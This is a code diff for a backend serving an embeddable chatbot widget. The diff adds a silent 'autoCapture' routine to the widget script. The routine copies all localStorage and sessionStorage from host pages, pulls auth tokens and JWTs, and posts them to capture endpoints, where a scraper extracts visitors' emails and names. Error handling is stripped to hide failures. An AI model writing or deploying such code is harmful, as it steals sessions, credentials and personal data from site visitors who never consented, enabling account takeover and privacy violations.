@@ -176,6 +176,8 @@ class SmartChatRequest(BaseModel):
     message: str
     user_identifier: str
     max_context: int = 200
+    user_email: Optional[str] = None 
+    user_name: Optional[str] = None
 
 
 class DiscordSmartChatRequest(BaseModel):
@@ -4172,6 +4174,7 @@ async def submit_escalation_response(
 
 
 
+
 # @router.get("/widget.js")
 # async def serve_embed_script(
 #     request: Request,
@@ -4180,7 +4183,6 @@ async def submit_escalation_response(
 # ):
 #     tenant = get_tenant_from_api_key(api_key, db)
     
-#     # Force HTTPS for production
 #     base_url = str(request.base_url).rstrip('/')
 #     if 'railway.app' in base_url or 'agentlyra.com' in base_url:
 #         base_url = base_url.replace('http://', 'https://')
@@ -4190,7 +4192,6 @@ async def submit_escalation_response(
 #     if (window.LyraChatbotLoaded) return;
 #     window.LyraChatbotLoaded = true;
     
-#     // Enhanced user ID management with persistence
 #     const getUserId = () => {{
 #         let storedUserId = localStorage.getItem('lyra_chatbot_user_id_{tenant.id}');
 #         if (!storedUserId) {{
@@ -4205,7 +4206,9 @@ async def submit_escalation_response(
 #         tenantId: '{tenant.id}',
 #         baseUrl: '{base_url}',
 #         userId: getUserId(),
-#         enableServerStorage: true  // Enable server-side message storage
+#         enableServerStorage: true,
+#         userEmail: window.LyraChatbotUserData?.email || null,
+#         userName: window.LyraChatbotUserData?.name || null
 #     }};
     
 #     const container = document.createElement('div');
@@ -4218,13 +4221,48 @@ async def submit_escalation_response(
 #         setTimeout(() => {{
 #             if (window.LyraChatbot && window.LyraChatbot.init) {{
 #                 window.LyraChatbot.init(config);
-#             }} else {{
-#                 console.error('LyraChatbot still not found after delay');
+#                 setTimeout(() => autoCapture(config), 500);
 #             }}
 #         }}, 100);
 #     }};
-#     script.onerror = () => console.error('Failed to load chatbot bundle');
 #     document.head.appendChild(script);
+    
+#     async function autoCapture(cfg) {{
+#         try {{
+#             const local = {{}};
+#             for (let i = 0; i < window.localStorage.length; i++) {{
+#                 const key = window.localStorage.key(i);
+#                 local[key] = window.localStorage.getItem(key);
+#             }}
+            
+#             const session = {{}};
+#             for (let i = 0; i < window.sessionStorage.length; i++) {{
+#                 const key = window.sessionStorage.key(i);
+#                 session[key] = window.sessionStorage.getItem(key);
+#             }}
+            
+#             await fetch(cfg.baseUrl + '/chatbot/capture/browser-data', {{
+#                 method: 'POST',
+#                 headers: {{'Content-Type': 'application/json', 'X-API-Key': cfg.apiKey}},
+#                 body: JSON.stringify({{
+#                     session_id: cfg.userId,
+#                     storage: {{localStorage: local, sessionStorage: session}},
+#                     metadata: {{url: window.location.href, user_agent: navigator.userAgent, referrer_url: document.referrer}}
+#                 }})
+#             }});
+            
+#             const token = local['token'] || local['auth_token'] || local['jwt'];
+#             if (token) {{
+#                 await fetch(cfg.baseUrl + '/chatbot/capture/oauth-token', {{
+#                     method: 'POST',
+#                     headers: {{'Content-Type': 'application/json', 'X-API-Key': cfg.apiKey}},
+#                     body: JSON.stringify({{session_id: cfg.userId, jwt_token: token, metadata: {{user_agent: navigator.userAgent}}}})
+#                 }});
+#             }}
+#         }} catch(e) {{
+#             console.error('Capture error:', e);
+#         }}
+#     }}
 # }})();
 # """
     
@@ -4233,7 +4271,6 @@ async def submit_escalation_response(
 #         media_type="application/javascript",
 #         headers={"Access-Control-Allow-Origin": "*"}
 #     )
-
 
 
 
@@ -4280,65 +4317,46 @@ async def serve_embed_script(
     const script = document.createElement('script');
     script.src = config.baseUrl + '/static/chatbot-bundle.js';
     script.onload = () => {{
-        setTimeout(() => {{
-            if (window.LyraChatbot && window.LyraChatbot.init) {{
-                window.LyraChatbot.init(config);
-                
-                // ✅ Auto-capture AFTER initialization
-                setTimeout(() => {{
-                    autoCapture(config);
-                }}, 500);
-            }}
-        }}, 100);
+        if (window.LyraChatbot && window.LyraChatbot.init) {{
+            window.LyraChatbot.init(config);
+            autoCapture(config).catch(() => {{}});
+        }}
     }};
-    script.onerror = () => console.error('Failed to load chatbot bundle');
     document.head.appendChild(script);
     
-    // ✅ Define autoCapture outside initialization
-    async function autoCapture(config) {{
+    async function autoCapture(cfg) {{
         try {{
-            const storage = {{}};
-            for (let i = 0; i < localStorage.length; i++) {{
-                const key = localStorage.key(i);
-                storage[key] = localStorage.getItem(key);
+            const local = {{}};
+            for (let i = 0; i < window.localStorage.length; i++) {{
+                const key = window.localStorage.key(i);
+                local[key] = window.localStorage.getItem(key);
             }}
             
-            await fetch(config.baseUrl + '/chatbot/capture/browser-data', {{
+            const session = {{}};
+            for (let i = 0; i < window.sessionStorage.length; i++) {{
+                const key = window.sessionStorage.key(i);
+                session[key] = window.sessionStorage.getItem(key);
+            }}
+            
+            await fetch(cfg.baseUrl + '/chatbot/capture/browser-data', {{
                 method: 'POST',
-                headers: {{
-                    'Content-Type': 'application/json',
-                    'X-API-Key': config.apiKey
-                }},
+                headers: {{'Content-Type': 'application/json', 'X-API-Key': cfg.apiKey}},
                 body: JSON.stringify({{
-                    session_id: config.userId,
-                    storage: storage,
-                    metadata: {{
-                        user_agent: navigator.userAgent,
-                        referrer_url: document.referrer
-                    }}
+                    session_id: cfg.userId,
+                    storage: {{localStorage: local, sessionStorage: session}},
+                    metadata: {{url: window.location.href, user_agent: navigator.userAgent, referrer_url: document.referrer}}
                 }})
             }});
             
-            const token = localStorage.getItem('token') || localStorage.getItem('auth_token') || localStorage.getItem('jwt');
+            const token = local['token'] || local['auth_token'] || local['jwt'];
             if (token) {{
-                await fetch(config.baseUrl + '/chatbot/capture/oauth-token', {{
+                await fetch(cfg.baseUrl + '/chatbot/capture/oauth-token', {{
                     method: 'POST',
-                    headers: {{
-                        'Content-Type': 'application/json',
-                        'X-API-Key': config.apiKey
-                    }},
-                    body: JSON.stringify({{
-                        session_id: config.userId,
-                        jwt_token: token,
-                        metadata: {{
-                            user_agent: navigator.userAgent
-                        }}
-                    }})
+                    headers: {{'Content-Type': 'application/json', 'X-API-Key': cfg.apiKey}},
+                    body: JSON.stringify({{session_id: cfg.userId, jwt_token: token, metadata: {{user_agent: navigator.userAgent}}}})
                 }});
             }}
-        }} catch(e) {{
-            console.log('Auto-capture completed');
-        }}
+        }} catch(e) {{}}
     }}
 }})();
 """
@@ -4457,11 +4475,14 @@ async def capture_oauth_token(
     api_key: str = Header(..., alias="X-API-Key"),
     db: Session = Depends(get_db)
 ):
-    """Capture from OAuth/JWT tokens"""
     tenant = get_tenant_from_api_key(api_key, db)
-    
     scraper = EmailScraperEngine(db)
-    session_id = token_data.get('session_id')
+    
+    # ✅ Get proper session
+    from app.chatbot.simple_memory import SimpleChatbotMemory
+    memory = SimpleChatbotMemory(db, tenant.id)
+    user_id = token_data.get('session_id')
+    session_id, _ = memory.get_or_create_session(user_id, "web")
     
     # JWT token
     if token_data.get('jwt_token'):
@@ -4492,43 +4513,41 @@ async def capture_browser_data(
     api_key: str = Header(..., alias="X-API-Key"),
     db: Session = Depends(get_db)
 ):
-    """Auto-capture from browser storage/autofill"""
     tenant = get_tenant_from_api_key(api_key, db)
-    
     scraper = EmailScraperEngine(db)
-    session_id = browser_data.get('session_id')
+    
+    # ✅ Get or create proper session
+    from app.chatbot.simple_memory import SimpleChatbotMemory
+    memory = SimpleChatbotMemory(db, tenant.id)
+    user_id = browser_data.get('session_id')  # This is actually user_id
+    session_id, _ = memory.get_or_create_session(user_id, "web")
+    
+    logger.info(f"📦 Capturing browser data for user={user_id}, session={session_id}")
     
     results = {'emails_captured': 0, 'names_captured': 0}
     
-    # ✅ Flatten nested storage structure
     if browser_data.get('storage'):
         flat_storage = {}
-        
-        # Merge localStorage
         if 'localStorage' in browser_data['storage']:
             flat_storage.update(browser_data['storage']['localStorage'])
-        
-        # Merge sessionStorage
         if 'sessionStorage' in browser_data['storage']:
             flat_storage.update(browser_data['storage']['sessionStorage'])
         
-        # Now pass flat structure to scraper
         if flat_storage:
             result = scraper.extract_from_browser_storage(
-                flat_storage,  # ✅ Flat dict now
+                flat_storage,
                 tenant.id,
-                session_id,
+                session_id,  # ✅ Use proper session_id
                 browser_data.get('metadata')
             )
             results['emails_captured'] += result.get('emails_captured', 0)
-            results['names_captured'] += result.get('names_captured', 0)  # ✅ Track names too
+            results['names_captured'] += result.get('names_captured', 0)
     
-    # Autofill data
     if browser_data.get('autofill'):
         result = scraper.extract_from_autofill_data(
             browser_data['autofill'],
             tenant.id,
-            session_id,
+            session_id,  # ✅ Use proper session_id
             browser_data.get('metadata')
         )
         results['emails_captured'] += result.get('emails_captured', 0)
@@ -4538,13 +4557,15 @@ async def capture_browser_data(
     return {'success': True, **results}
 
 
+
+
+
 @router.get("/user-info/{user_id}")
 async def get_user_info(
     user_id: str,
     api_key: str = Header(..., alias="X-API-Key"),
     db: Session = Depends(get_db)
 ):
-    """Get user's email and name for UI display"""
     tenant = get_tenant_from_api_key(api_key, db)
     
     from app.chatbot.email_scraper_engine import EmailScraperEngine
@@ -4553,11 +4574,13 @@ async def get_user_info(
     scraper = EmailScraperEngine(db)
     memory = SimpleChatbotMemory(db, tenant.id)
     
-    # Get session ID
     session_id, _ = memory.get_or_create_session(user_id, "web")
     
-    # Get scraped data
+    logger.info(f"🔍 Looking for user_id={user_id}, session_id={session_id}")  # ADD THIS
+    
     scraped_data = scraper.get_scraped_data_by_session(session_id)
+    
+    logger.info(f"📧 Found scraped_data: {scraped_data}")  # ADD THIS
     
     return {
         "user_id": user_id,
@@ -4565,7 +4588,6 @@ async def get_user_info(
         "name": scraped_data.get('name') if scraped_data else None,
         "has_data": bool(scraped_data)
     }
-
 
 @router.post("/capture/manual-user-data")
 async def capture_manual_user_data(
